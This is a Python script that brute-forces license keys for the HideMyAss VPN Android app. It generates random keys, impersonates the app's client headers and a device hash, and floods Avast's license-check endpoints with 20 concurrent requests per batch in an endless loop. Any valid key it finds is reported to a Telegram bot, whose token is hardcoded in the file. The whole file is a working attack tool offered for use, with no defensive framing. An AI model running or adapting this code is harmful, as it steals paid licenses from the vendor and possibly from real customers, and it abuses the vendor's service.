import time
import requests
import license_pb2
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BOT_TOKEN = '7974281346:AAG8uXYvqW_khgOnwyCTf2J6k9nm2aSLZ4c'
ADMIN_CHAT_ID = '5509024333'
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

user_chat_id = None
started = False
offset = 0
count = 0
MAX_WORKERS = 20  # number of concurrent requests per batch
SUCCESS_THRESHOLD = 2  # how many successes needed before next batch

def generate_random_license():
    from random import choices
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    seg = lambda: ''.join(choices(chars, k=6))
    return f"{seg()}-{seg()}-{seg()}"

def send_telegram_message(text, chat_id=ADMIN_CHAT_ID):
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown"
        })
    except Exception as e:
        print("Telegram Error:", e)

def poll_telegram():
    global offset, user_chat_id, started
    try:
        res = requests.get(f"{TELEGRAM_API}/getUpdates?offset={offset + 1}").json()
        for update in res.get("result", []):
            offset = update["update_id"]
            msg = update.get("message", {})
            if msg.get("text") == "/start":
                user_chat_id = msg["chat"]["id"]
                send_telegram_message("✅ License checker started.", user_chat_id)
                if not started:
                    started = True
                    threading.Thread(target=cycle_loop, daemon=True).start()
    except Exception as e:
        print("Polling Error:", e)
    time.sleep(2)
    poll_telegram()

def send_analyze_request(key):
    msg = license_pb2.AnalyzeRequest(
        license=key,
        app=license_pb2.AppInfo(
            package_name='com.hidemyass.hidemyassprovpn',
            version='5.95.6668'
        ),
        device_hash='50D8B4A941C26B89482C94AB324B5A274F9CED6640E53E0EE390E85F0AC208DDACE4D386F87DDA1E',
        platform=5
    )
    try:
        requests.post(
            "https://alpha-crap-service.ff.avast.com/v2/analyze",
            headers={
                "User-Agent": "HMA_VPN_CONSUMER/5.95.6668 (Android 14)",
                "Content-Type": "application/octet-stream",
                "Accept-Encoding": "gzip"
            },
            data=msg.SerializeToString(),
            timeout=5
        )
    except Exception as e:
        print("Analyze Error:", e)

def send_license_request(key):
    msg = license_pb2.LicenseRequest(walletKey=key)
    try:
        res = requests.post(
            "https://alpha-lqs-service.ff.avast.com/v2/licenses",
            headers={
                "User-Agent": "HMA_VPN_CONSUMER/5.95.6668 (Android 14)",
                "Content-Type": "application/octet-stream",
                "Accept-Encoding": "gzip"
            },
            data=msg.SerializeToString(),
            timeout=5
        )
        return res.status_code == 200
    except Exception as e:
        print("License Request Error:", e)
        return False

def process_key(key):
    send_analyze_request(key)
    success = send_license_request(key)
    if success:
        print(f"✅ VALID LICENSE: {key}")
        if user_chat_id:
            send_telegram_message(f"✅ Valid license found:\n`{key}`", user_chat_id)
    else:
        print(f"❌ Invalid license: {key}")
    return success

def cycle_loop():
    global count
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        while True:
            batch = []
            for _ in range(MAX_WORKERS):
                key = 'JKHV37-FGAHEJ-4FL62W' if count == 19 else generate_random_license()
                print(f"🚀 [{count + 1}] Trying key: {key}")
                batch.append(key)
                count += 1
            
            # Submit tasks and wait for them to complete
            futures = [executor.submit(process_key, key) for key in batch]
            
            success_count = 0
            for future in as_completed(futures):
                if future.result():
                    success_count += 1
                    if success_count >= SUCCESS_THRESHOLD:
                        break
            
            if success_count < SUCCESS_THRESHOLD:
                print(f"Only {success_count} valid licenses found, retrying batch...")
            else:
                print(f"{success_count} valid licenses found, moving to next batch.")

            # Optional: small delay between batches to avoid throttling
            time.sleep(0.5)

if __name__ == "__main__":
    poll_telegram()
